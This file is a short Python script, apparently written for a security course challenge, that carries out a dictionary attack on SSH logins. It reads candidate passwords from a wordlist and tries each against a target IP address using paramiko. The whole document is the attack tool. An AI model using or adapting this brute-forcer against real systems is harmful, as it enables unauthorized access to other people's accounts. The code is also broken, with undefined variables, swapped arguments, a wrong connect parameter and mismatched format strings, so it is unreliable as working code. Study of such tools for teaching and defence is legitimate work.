#!/usr/bin/env python3
###########################
# Title: OpsChallenge16
# Author:Jeff Snyder
# Date: 26OCT2020
# Purpose: Dictionary attack against SSH connection
###########################
import smtplib
import itertools
import sys
import time
import getpass
import paramiko
import os
import socket

def cracker(user, ipAddress, txtFile ):
    filepath =open(txtFile)
    for i in filepath.readlines():
        secret=i.strip("\n")
        try:
            response= bruteForceSSH(secret, user, ipAddress)
            if response ==0:
                print("%s[*] User: %s [*] Pass Found: %s%s"%(line, username, secret, line))
                sys.exit(0)
            elif response ==1:
                print("%s[*] User: %s [*] Pass Found: %s%s"%(line, username, line))
            elif response ==2:
                print("%s[*] User: %s [*] Pass Found: %s%s"%(line, username, password, line))
        except Exception:
            print(Exception)
            pass

def bruteForceSSH(secret, ipAddress, user):
    ssh=paramiko.SSHClient()
    # ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    try:
        ssh.connect(host=ipAddress,port=22, username=user, password=secret)
    except paramiko.AuthenticationException:
        code =1
    except socket.error:
        code =2
    ssh.close()
    return code


def main():
    print("Shall we play a game?")
    user=input("What is the username for the SSH connection?")
    ipAddress=input("What is the ip address of the target system?")
    txtFile=input("What is the folder path to your dictionary file?")
    cracker(user, ipAddress, txtFile)
    
main()



# with help from https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/